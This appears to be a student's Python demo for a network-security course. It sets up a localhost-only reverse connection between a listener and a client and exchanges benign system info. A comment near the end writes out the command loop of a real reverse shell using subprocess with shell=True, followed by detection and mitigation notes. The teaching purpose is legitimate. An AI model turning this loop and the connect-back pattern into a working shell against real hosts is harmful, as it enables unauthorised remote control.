# =============================================================================
# PortHive v2.0 — Educational Payload Architecture Demo
# Author  : Eyad Alsadi  |  ID: 202211140
# Course  : Information & Network Security Programming (605346)
# Instructor: Dr. Mohammad Arafah  |  University of Petra — 2025/2026
#
# ╔══════════════════════════════════════════════════════════════════════╗
# ║             EDUCATIONAL PURPOSES ONLY — AUTHORIZED USE              ║
# ║  This script demonstrates the ARCHITECTURE of a reverse connection. ║
# ║  It connects to 127.0.0.1 (localhost) ONLY and executes NO system   ║
# ║  commands. It is a conceptual socket-communication demo.             ║
# ║  Using reverse shells against real systems is ILLEGAL and UNETHICAL. ║
# ╚══════════════════════════════════════════════════════════════════════╝
# =============================================================================

import socket
import platform
import os
from datetime import datetime

# ── Hardcoded to localhost — cannot target external systems ───────────────────
LHOST = "127.0.0.1"   # FIXED: localhost only — do not change
LPORT = 4444

BANNER = """
╔══════════════════════════════════════════════════════╗
║   PortHive — Educational Reverse Connection Demo     ║
║   Localhost (127.0.0.1) ONLY  |  No cmd execution   ║
╚══════════════════════════════════════════════════════╝
"""


def get_system_info() -> str:
    """
    Returns safe, read-only system metadata (OS version, hostname, CWD).
    This represents what a real payload would harvest — but reads no
    sensitive data and executes no shell commands.
    """
    return (
        f"  OS       : {platform.system()} {platform.release()}\n"
        f"  Hostname : {socket.gethostname()}\n"
        f"  CWD      : {os.getcwd()}\n"
        f"  Time     : {datetime.now():%Y-%m-%d %H:%M:%S}\n"
        f"  Python   : {platform.python_version()}"
    )


def start_listener() -> None:
    """
    Listener side — simulates the attacker's C2 (Command & Control) endpoint.
    Run this FIRST in Terminal 1:  python payload.py --mode listen
    """
    print(BANNER)
    print(f"[*] Listener bound to {LHOST}:{LPORT}")
    print("[*] Waiting for reverse connection …\n")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LHOST, LPORT))         # bind: attach to localhost port
    server.listen(1)

    conn, addr = server.accept()        # accept: block until client connects
    print(f"[+] Connection received from {addr}\n")

    with conn:
        # Receive and display the system info sent by the shell side
        data = conn.recv(2048).decode(errors="ignore")
        print("[+] Remote system information:\n")
        print(data)
        print("\n[*] Demo complete. In a real payload, a command loop")
        print("    would follow here. This demo stops at info exchange.")

    server.close()
    print("\n[+] Listener closed cleanly.")


def start_shell() -> None:
    """
    Shell side — simulates the victim connecting back to the attacker.
    Run this SECOND in Terminal 2:  python payload.py --mode shell
    """
    print(BANNER)
    print(f"[*] Connecting back to {LHOST}:{LPORT} …")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((LHOST, LPORT))    # connect: establish reverse channel
        print("[+] Reverse connection established.")

        # Send only safe, read-only system metadata — no shell execution
        info = get_system_info()
        sock.sendall(info.encode())
        print("[+] System info sent to listener.")
        sock.close()

    except ConnectionRefusedError:
        print(f"[-] Could not connect to {LHOST}:{LPORT}")
        print("    Start the listener first:  python payload.py --mode listen")


# ── How a real reverse shell would differ (concept explanation) ───────────────
#
# A real reverse shell adds a command loop after the connection:
#
#   while True:
#       cmd = sock.recv(1024).decode()          # receive command from attacker
#       result = subprocess.run(cmd, shell=True,
#                               capture_output=True, text=True)
#       sock.sendall(result.stdout.encode())    # send output back
#
# Detection indicators:
#   - Outbound TCP connection on non-standard port
#   - subprocess.run(shell=True) in code
#   - Long-lived socket connection with bidirectional data
#
# Mitigation:
#   - Egress firewall rules blocking unexpected outbound connections
#   - IDS/IPS signatures for raw reverse-shell traffic
#   - Application whitelisting to block unauthorised subprocess calls
#
# =============================================================================


if __name__ == "__main__":
    import argparse
    print(BANNER)
    parser = argparse.ArgumentParser(
        description="PortHive Educational Payload Demo (localhost only)"
    )
    parser.add_argument(
        "--mode", choices=["listen", "shell"], required=True,
        help="listen = start the listener (Terminal 1) | "
             "shell  = connect back     (Terminal 2)"
    )
    args = parser.parse_args()

    if args.mode == "listen":
        start_listener()
    else:
        start_shell()
